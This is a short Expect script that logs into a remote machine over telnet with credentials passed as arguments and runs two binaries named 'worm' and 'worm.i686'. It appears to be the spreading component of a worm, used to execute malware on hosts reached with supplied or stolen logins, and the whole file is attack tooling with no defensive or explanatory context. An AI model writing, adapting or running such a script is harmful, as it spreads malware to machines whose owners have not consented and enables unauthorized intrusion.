#!/usr/bin/expect
set timeout 1
set ip [lindex $argv 0]
set port [lindex $argv 1]
set username [lindex $argv 2]
set password [lindex $argv 3]
spawn telnet $ip $port -l $username
expect "password:"
send "$password\r"
expect "$"
send "./worm ; ./worm.i686\r"
expect "$"
sleep 2
send "exit\r"
expect eof
